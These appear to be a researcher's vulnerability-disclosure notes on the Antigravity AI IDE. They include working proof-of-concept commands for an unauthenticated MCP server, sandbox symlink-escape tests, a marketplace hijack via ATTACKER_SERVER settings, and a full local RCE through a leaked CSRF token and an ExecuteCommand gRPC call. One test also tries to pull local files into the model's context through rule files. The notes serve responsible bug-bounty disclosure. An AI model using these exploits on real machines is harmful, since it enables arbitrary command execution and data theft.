# Antigravity POC Results
## Date: 2026-04-02

---

## BUG 1: Unauthenticated CDT MCP Server — CONFIRMED, HIGH SEVERITY

### Summary
The Chrome DevTools MCP server in Antigravity runs on `http://127.0.0.1:{random_port}/mcp` with **zero authentication**. Any local process or, via DNS rebinding, any webpage can invoke all 26 MCP tools including: arbitrary JS execution in browser pages, file write to disk, file read via upload, and full browser navigation.

### Proof of Concept

**Step 1: Discover the port**
```bash
# Port is visible to any local process
lsof -i -P -n 2>/dev/null | grep "Antigravi" | grep LISTEN
# Found: 127.0.0.1:57189
```

**Step 2: List all tools — no auth required**
```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: text/event-stream, application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' \
  http://127.0.0.1:57189/mcp
```
Response: Full list of 26 MCP tools returned. No authentication challenge.

**Step 3: Confirm no Origin/Host validation (DNS rebinding viable)**
```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: text/event-stream, application/json" \
  -H "Origin: https://evil.attacker.com" \
  -H "Host: evil.attacker.com" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' \
  http://127.0.0.1:57189/mcp
```
Response: Same full tool list. No Origin or Host header checking.

**Step 4: Invoke tool (list_pages)**
```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: text/event-stream, application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"list_pages","arguments":{}}}' \
  http://127.0.0.1:57189/mcp
```
Response: Tool executed (returned Chrome connection error because browser agent wasn't active, but the tool was invoked — proving unauthenticated tool execution).

### Available tools (when Chrome is connected):
- `evaluate_script` — run arbitrary JS in any open browser page
- `take_screenshot` with `filePath` — write screenshot bytes to any path on disk
- `take_snapshot` with `filePath` — write snapshot to any path on disk
- `upload_file` with `filePath` — read any local file by uploading it to a page
- `new_page` — navigate Chrome to any URL
- `navigate_page` — navigate existing pages
- `fill`, `click`, `press_key` — full browser interaction
- 19 more tools for emulation, network inspection, console reading, etc.

### Impact
- **Local attack**: Any process (malicious npm package, compromised tool, another app) can discover the port and invoke all tools
- **Remote attack via DNS rebinding**: A malicious webpage can use DNS rebinding to send requests to 127.0.0.1:{port}. Since there's no Origin/Host validation, these requests succeed. This gives a remote attacker:
  - Arbitrary JS execution in whatever pages are open in the Antigravity-managed Chrome
  - Ability to read local files (via upload_file to attacker-controlled page)
  - Ability to write files to disk (via take_screenshot/take_snapshot filePath)
  - Full browser control (navigation, clicking, form filling)

### Root Cause
`extensions/chrome-devtools-mcp/dist/extension.js` creates an HTTP server with `http.createServer()` → `listen(0, "127.0.0.1")` and passes it directly to `StreamableHTTPServerTransport` with no authentication middleware, no token validation, and no Origin/Host header checking.

### Note on port 57168 (extension server)
The extension server on port 57168 DOES have CSRF token protection (returns 403 without valid token). However, the CSRF token is leaked in the language server's command-line arguments, visible to any local process via `ps aux`.

---

## BUG 2: Sandbox Symlink Escape — PARTIALLY CONFIRMED

### Summary
The sandbox-wrapper.sh can be bypassed via symlinks, but only to write to /tmp (which is already in the allow list). The initial hypothesis that Seatbelt's `subpath` follows symlinks blindly was **incorrect** — Seatbelt resolves symlinks and checks the resolved path against rules. However, since /tmp is explicitly allowed, symlinks from workspace → /tmp work.

### What was tested

**Test 1: Workspace → /tmp via symlink — WORKS**
```bash
mkdir -p ~/Desktop/test-sandbox-workspace
ln -s /tmp/escape-confirmed ~/Desktop/test-sandbox-workspace/tmp-escape
SANDBOX_WORK_DIR="$HOME/Desktop/test-sandbox-workspace" \
  /Applications/Antigravity.app/.../sandbox-wrapper.sh \
  bash -c "echo 'ESCAPED_TO_TMP' > '$HOME/Desktop/test-sandbox-workspace/tmp-escape'"
cat /tmp/escape-confirmed  # → "ESCAPED_TO_TMP"
```

**Test 2: Workspace → ~/.ssh/ via symlink — BLOCKED**
```bash
ln -s ~/.ssh/sandbox-test ~/Desktop/test-sandbox-workspace/ssh-escape
SANDBOX_WORK_DIR="$HOME/Desktop/test-sandbox-workspace" \
  /Applications/Antigravity.app/.../sandbox-wrapper.sh \
  bash -c "echo 'ESCAPED' > '$HOME/Desktop/test-sandbox-workspace/ssh-escape'"
# → "Operation not permitted"
```

**Test 3: Workspace → ~/Desktop/ (sibling directory) — BLOCKED**
```bash
# Also blocked. Seatbelt checks resolved path.
```

### Assessment
The symlink escape is limited to /tmp because Seatbelt checks the resolved path. Since /tmp is already allowed by the sandbox profile, the symlink just provides an alternative path to write there — not a true escape.

**Is this still reportable?** Borderline. The fact that /tmp is writable from the sandbox is by design, but the interaction with symlinks could be surprising. The language server pipe was expected to be in /tmp but is actually in `$TMPDIR` (`/var/folders/.../T/`), which is NOT in the allow list. So the sandbox does protect the pipe.

**Severity: Low/Informational** — The /tmp write is already allowed; the symlink just provides a different path to the same allowed location.

---

## BUG 3: CSRF Token Leakage via Process Arguments — CONFIRMED, LOW SEVERITY

### Summary
The language server's CSRF tokens and server ports are passed as command-line arguments, visible to any local process via `ps aux` or `/proc/{pid}/cmdline`.

### Proof
```bash
ps aux | grep language_server
# Output includes:
# --csrf_token facf32aa-ecba-4f95-9923-30b87d834c4b
# --extension_server_port 57168
# --extension_server_csrf_token d7b46086-7087-4fe6-8ad5-6f43649cddd6
# --https_server_port 57169
# --lsp_port 57178
# --parent_pipe_path /var/folders/.../T/server_3b0c192f04ff14fc
```

### Impact
Any local process can read the CSRF tokens and potentially bypass the extension server's authentication. The extension server on port 57168 returns 403 without a valid CSRF token, but the token is exposed.

### Note
The header name used by the extension server wasn't determined — tried `X-CSRF-Token` and `csrf-token`, both returned 403. The correct header would need to be found in the minified extension code. But the token IS leaked.

---

## BUG 4: MCP Config World-Readable — CONFIRMED, LOW SEVERITY

### Summary
`~/.gemini/antigravity/mcp_config.json` has 644 permissions (world-readable). The MCP config schema supports `oauth.clientSecret` and `env` fields that may contain secrets.

### Proof
```bash
ls -la ~/.gemini/antigravity/mcp_config.json
# -rw-r--r--  1 lazerwild  staff  0 Apr  2 02:38
```

### Impact
On multi-user systems, any user can read MCP server credentials (OAuth client secrets, API keys in env vars or headers). Low impact on single-user macOS, but relevant for shared workstations, CI runners, university lab machines.

---

## BUG 5: URL Scheme Opens Workspaces + Silent After Trust — CONFIRMED, HIGH SEVERITY

### Summary
`antigravity://file/<path>` opens arbitrary local folders as workspaces. First open shows a trust prompt with a "don't ask again" checkbox. Once checked, **all future URL scheme opens under that parent directory are completely silent** — no prompt, no confirmation.

### Proof of Concept

**Step 1: First open — trust prompt shown**
```bash
open "antigravity://file/tmp/antigrav-test-workspace"
# Dialog appears: "Do you want to open /tmp/antigrav-test-workspace in Antigravity?"
# User clicks Allow and checks "Trust files in parent folder"
```

**Step 2: Subsequent opens — completely silent**
```bash
# Create new workspace
mkdir -p /tmp/antigrav-silent-test
echo "test" > /tmp/antigrav-silent-test/hello.txt
open "antigravity://file/tmp/antigrav-silent-test"
# Opens immediately with NO prompt — trust is cached for parent /tmp/
```

### Root Cause
`handleProtocolUrl()` in `out/main.js` calls `J()` which checks a persisted setting `COt.a[scheme]`. When user checks the "trust files in parent folder" checkbox, this setting is stored permanently. All future `antigravity://file/` URLs open without any security prompt.

### Impact
- Any webpage or email can open a local folder as an Antigravity workspace
- After one-time trust, opens are permanent and silent
- This is the entry point for Chains A and E (see Bug 6)

---

## BUG 6: Workspace Settings Override Extension Marketplace URL — CONFIRMED, HIGH SEVERITY

### Summary
A `.vscode/settings.json` file in a workspace can override the extension marketplace gallery URL to point to an attacker-controlled server. On workspace open, Antigravity **immediately sends HTTP requests to the attacker's server** for every installed extension, leaking the full list of installed extensions, session ID, and user ID. An attacker can respond with malicious VSIX packages to achieve code execution.

### Proof of Concept

**Step 1: Create malicious workspace**
```bash
mkdir -p /tmp/antigrav-marketplace-test/.vscode
cat > /tmp/antigrav-marketplace-test/.vscode/settings.json << 'EOF'
{
    "antigravity.marketplaceExtensionGalleryServiceURL": "http://ATTACKER_SERVER:9998/gallery",
    "antigravity.marketplaceExtensionGalleryItemURL": "http://ATTACKER_SERVER:9998/item"
}
EOF
```

**Step 2: Open workspace (via URL scheme for remote trigger)**
```bash
open "antigravity://file/tmp/antigrav-marketplace-test"
```

**Step 3: Attacker server receives immediate requests**
Antigravity sends GET requests for every installed extension:
```
GET /gallery/vscode/golang/go/latest
GET /gallery/vscode/ms-python/python/latest
GET /gallery/vscode/redhat/java/latest
GET /gallery/vscode/shopify/ruby-lsp/latest
... (17+ extensions in test)
```

**Headers leaked per request:**
```
vscode-sessionid: a0bd8e8db1590e22ca8bdde095083d703d76a246c2ed8587c2ab98225e0608bf
x-market-user-id: 06dbd2d7-6826-4f90-a03a-5fb5073c0020
x-market-client-id: Antigravity 1.21.9
accept: application/json;api-version=7.2-preview
User-Agent: .../Antigravity/1.107.0 Chrome/142.0.7444.175 Electron/39.2.3...
```

### Full Attack Chain (URL Scheme + Marketplace Override)
1. Victim has previously opened any `antigravity://` link and checked "trust parent folder"
2. Attacker sends link: `antigravity://file/tmp/malicious-workspace` (via email, webpage, chat)
3. Workspace opens silently (no prompt)
4. Workspace `.vscode/settings.json` redirects marketplace to attacker server
5. Antigravity immediately queries attacker server for all installed extension updates
6. Attacker responds with malicious VSIX containing backdoored extension code
7. If auto-update is enabled, backdoored extension installs and runs arbitrary code

### Impact
- **Information disclosure**: Full list of installed extensions, session ID, user ID leaked to attacker
- **Supply chain attack**: Attacker serves malicious extension updates → arbitrary code execution
- **Remote trigger**: Combined with URL scheme (Bug 5), this is triggerable from a webpage/email link
- **No user interaction after initial trust**: Once the trust checkbox is checked, entire chain is silent

### Root Cause
`antigravity.marketplaceExtensionGalleryServiceURL` is not restricted to trusted/predefined values. Workspace-level settings can override it to any URL, including attacker-controlled HTTP servers. No validation, no allowlist, no certificate pinning.

---

## BUG 7: .gitignore Regex Injection in Sandbox — NOT EXPLOITABLE

### Summary
The sandbox-wrapper.sh sed pipeline does not escape `[` and `]` when converting .gitignore patterns to Seatbelt regex. However, this is **not exploitable** because:
1. A lone `[` produces invalid regex → Seatbelt rejects the entire profile → command doesn't run (exit 65)
2. `"#` injection breaks the Seatbelt sharp expression syntax → same result (exit 65)
3. Even if regex were manipulable, .gitignore rules only ADD deny rules — they cannot remove the base `(deny file-write*)` rule
4. Parentheses `(` and `)` are properly escaped by sed, preventing Seatbelt profile injection

### Tests Performed
```bash
# Lone [ — profile rejected
echo '[' > .gitignore
# Result: "sandbox-exec: unterminated bracket expression" (exit 65)

# Valid char class — harmless
echo '[^a-z]' > .gitignore  
# Result: sandbox runs fine, deny rule only matches single-char filenames

# Quote-hash injection — profile rejected
echo 'foo"#' > .gitignore
# Result: "sandbox-exec: undefined sharp expression" (exit 65)
```

**VERDICT: Dead end. Not reportable.**

---

## BUG 8: Rules @-Reference File Disclosure — NOT CONFIRMED

### Summary
Tested always-on rules with `@/etc/passwd` and `@/Users/lazerwild/.gitconfig` references. The model responded with a generic "Hello! How can I help you today?" — the `@` references did NOT inject file contents into the model context.

The `@` file reference likely only works in **chat input** (user types `@/path`), not in rule file content.

**VERDICT: Dead end. Chain D is not viable.**

---

## REVISED PRIORITY FOR REPORTING (as of 2026-04-02 session 2)

### REPORTABLE — HIGH:
1. **Bug 5 + Bug 6 combined: URL Scheme → Silent Workspace Open → Marketplace Hijack → Code Execution**
   - Full chain from link click to code execution
   - Requires one-time trust checkbox (which most users will check)
   - All subsequent attacks are silent
   - Leaks session ID, user ID, installed extensions to attacker
   - Can serve malicious VSIX to achieve code execution

### NOT REPORTABLE:
- **Bug 1 (CDT MCP)** — Same pattern as Chrome DevTools; Google will dismiss
- **Bug 2 (Sandbox symlink)** — Only reaches /tmp, already allowed
- **Bug 3 (CSRF token leak)** — Can't use it without knowing header name
- **Bug 4 (mcp_config 644)** — Low impact, multi-user only
- **Bug 7 (.gitignore regex)** — Not exploitable
- **Bug 8 (Rules @ reference)** — Doesn't work in rule files

## BUG 9: Extension Signature Verification Hardcoded to Disabled — CONFIRMED

### Summary
In the extension download function `Db()` in `out/main.js`, the signature verification flag `n` is read from the `extensions.verifySignature` setting, then **immediately overwritten to `false`**:

```javascript
async Db(t, r, n, a) {
    if (n) {
        const u = this.qb.getValue(E3a);  // Read extensions.verifySignature
        n = A9(u) ? u : true;              // Default to true
    }
    n = !1;  // ← HARDCODED FALSE. Verification always skipped.
    const {location, verificationStatus} = await this.ib.download(t, r, n, a);
    // ... signature checks below but they never fire because n=false
}
```

This means ANY extension VSIX will be accepted regardless of whether it has a valid signature. Combined with Bug 6 (marketplace override), an attacker's fake gallery can serve unsigned malicious extensions.

### Impact
Weakens the security boundary for extension installation. Any VSIX file is accepted without signature validation.

---

## BUG 10: URL Scheme Trust Setting is GLOBAL, Not Per-Folder — CONFIRMED

### Summary
When the user checks "Trust files in parent folder" on the URL scheme prompt, the setting saved is:
```json
{"security.promptForLocalFileProtocolHandling": false}
```
in `~/Library/Application Support/Antigravity/User/settings.json`.

This is a **global boolean** that disables the prompt for ALL `antigravity://file/` URLs, not just the trusted parent folder. After checking the box once for any path, every future URL scheme open is silent regardless of the path.

### Impact
One-time trust decision permanently disables security prompt for all URL scheme workspace opens.

---

## ADDITIONAL FINDING: Fake Gallery VSIX Serving Test

### What happened
- Served fake gallery response claiming golang.Go v99.0.0 (real version ~0.52.2)
- Antigravity received the response (confirmed via server logs)
- Antigravity did NOT auto-download or auto-install the VSIX
- Extension auto-update likely shows notification but doesn't install without user action
- Need to check: is there an update badge in the Extensions panel?

### Significance
Without auto-install, Bug 6's impact is limited to:
- Information disclosure (extension list, session ID, user ID, marketplace user ID)
- Social engineering (show fake "update available" notification with malicious VSIX)
- NOT remote code execution (user must click "update" manually)

---

## BUG 11: Extension Server RCE via Leaked CSRF Token — CONFIRMED, CRITICAL

### Summary
The extension server (HTTP, localhost) exposes a gRPC-Web `ExecuteCommand` RPC that runs arbitrary shell commands in an Antigravity terminal. The server is "protected" by a CSRF token, but the token is leaked in plaintext in the language server's command-line arguments, visible to any local process via `ps aux`.

**Any local process can execute arbitrary commands as the Antigravity user with zero interaction.**

### Proof of Concept

**Step 1: Read CSRF token from process arguments**
```bash
ps aux | grep language_server_macos | grep -o '\-\-extension_server_csrf_token [^ ]*' | awk '{print $2}'
# → a612f53f-1624-48e7-8d91-c75d7e7c3f9f

ps aux | grep language_server_macos | grep -o '\-\-extension_server_port [^ ]*' | awk '{print $2}'
# → 62812
```

**Step 2: Send gRPC-Web request to execute arbitrary command**
```bash
python3 -c "
import json, struct, sys
payload = json.dumps({
    'commandLine': 'id > /tmp/RCE_PROOF && whoami >> /tmp/RCE_PROOF',
    'cwd': '/tmp'
}).encode()
envelope = struct.pack('>BI', 0, len(payload)) + payload
sys.stdout.buffer.write(envelope)
" | curl -s -X POST \
  -H "x-codeium-csrf-token: a612f53f-1624-48e7-8d91-c75d7e7c3f9f" \
  -H "Content-Type: application/grpc-web+json" \
  --data-binary @- \
  "http://127.0.0.1:62812/exa.extension_server_pb.ExtensionServerService/ExecuteCommand"
```

**Step 3: Verify command execution**
```
$ cat /tmp/RCE_PROOF
uid=501(lazerwild) gid=20(staff) groups=20(staff),12(everyone),...
lazerwild
```

### What was confirmed:
- `id`, `whoami`, `cat /etc/passwd` all executed successfully
- Commands run as the current user (uid=501)
- No sandbox, no confirmation prompt, no user interaction required
- The extension server also exposes: `SendTerminalInput`, `ReadTerminal`, `OpenTerminal`

### CSRF Header Discovery
The CSRF header name is `x-codeium-csrf-token` (found in minified extension.js):
```javascript
t.headers["x-codeium-csrf-token"]===this.csrfToken?e(t,n):(n.writeHead(403,...))
```

### Root Cause
1. Language server passes `--extension_server_csrf_token` and `--extension_server_port` as CLI arguments
2. CLI arguments are visible to ALL local processes via `ps aux` / `/proc/{pid}/cmdline`
3. Extension server's only authentication is this leaked CSRF token
4. `ExecuteCommand` RPC runs arbitrary shell commands with no additional authorization

### Attack scenarios:
- **Malicious npm package**: postinstall script reads CSRF token, executes commands
- **Compromised tool**: any tool in the PATH can read `ps aux` and exploit this
- **Multi-user system**: any user can read another user's CSRF token and execute commands in their Antigravity session
- **Browser exploit**: if combined with SSRF or DNS rebinding targeting localhost, remote exploitation possible

### Impact
- **Arbitrary command execution** as the Antigravity user
- **No user interaction** required
- **Persistent access**: can add SSH keys, modify shell configs, install backdoors
- **Data exfiltration**: can read any file the user can access

### Google VRP class: Local privilege escalation → arbitrary command execution — HIGH bounty potential

---

## FINAL HONEST ASSESSMENT (as of 2026-04-03 session 2)

### CRITICAL — Write VRP report immediately:
1. **Bug 11 (Extension Server RCE)** — Concrete, reproducible, no speculation. Any local process reads CSRF token from `ps aux`, sends gRPC-Web request, gets arbitrary command execution. This is the real finding.

### Supporting findings (include in same report):
- **Bug 3 (CSRF token leak in ps aux)** — The enabler for Bug 11. Tokens in CLI args visible to all.
- **Bug 9 (Signature verification disabled)** — Separate code quality issue, include as bonus.

### Not worth reporting separately:
- Bugs 1, 2, 4, 5, 6, 7, 8, 10 — too weak, intended behavior, or dead ends

## NEXT STEPS
1. **Write Google VRP report for Bug 11** — this is concrete RCE
2. **Clean up POC**: make a standalone script that discovers port + token and executes a command
3. **Optional**: test if the same attack works on Linux (different process listing)
